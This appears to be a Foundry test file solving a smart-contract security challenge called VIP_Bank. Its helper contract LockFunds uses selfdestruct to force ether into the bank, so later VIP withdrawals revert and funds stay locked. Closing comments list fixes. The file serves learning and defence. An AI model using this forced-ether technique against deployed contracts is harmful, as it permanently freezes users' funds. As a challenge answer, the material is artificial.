// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/VIP_Bank.sol";

contract VIP_BankSolution is Test {

    //At any cost, lock the VIP user balance forever into the contract.
    //0x01 deployer address
    //0x02 vitcim address (self destruct contract)
    //0x03 victim address (cannot withdraw)

    VIP_Bank public target;
    LockFunds public victim;

    function setUp() public {
        vm.prank(address(0x01));
        target = new VIP_Bank();

        victim = new LockFunds();
        
    }

    function testInitialConditions() public {

        address victimaddr = address(victim);
        vm.deal(victimaddr, 2 ether);
        vm.startPrank(victimaddr);
        vm.expectRevert(bytes("you are not our VIP customer"));
        target.deposit();
    }

    function testFundsGetLocked() public {

        address victimaddr = address(victim);
        vm.deal(victimaddr, 1 ether);

        vm.startPrank(address(0x01));
        target.addVIP(victimaddr);
        target.addVIP(address(0x03));
        vm.stopPrank();

        vm.startPrank(victimaddr);
        target.deposit{value: 50000000000000000}(); //0.05 ether
        assertEq(target.contractBalance(), 50000000000000000); //0.05 ether

        target.withdraw(50000000000000000);
        console.log("balance after withdraw: ", victimaddr.balance);
        //assertEq(target.contractBalance(), 0 ether);

        console.log("new bank balance:" , target.contractBalance());
        vm.stopPrank();

        vm.startPrank(address(0x03));
        vm.deal(address(0x03), 1 ether);
        target.deposit{value: 50000000000000000}();
        vm.expectRevert(bytes("Cannot withdraw more than 0.5 ETH per transaction"));
        target.withdraw(50000000000000000); //0.05 ether

        console.log("address(this).balance always >= maxETH");
        // solution do not use address(this).balance 
        // do not use first check
        // check for max ether on deposit
        // add payable function 

    }
}

contract LockFunds {
    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}
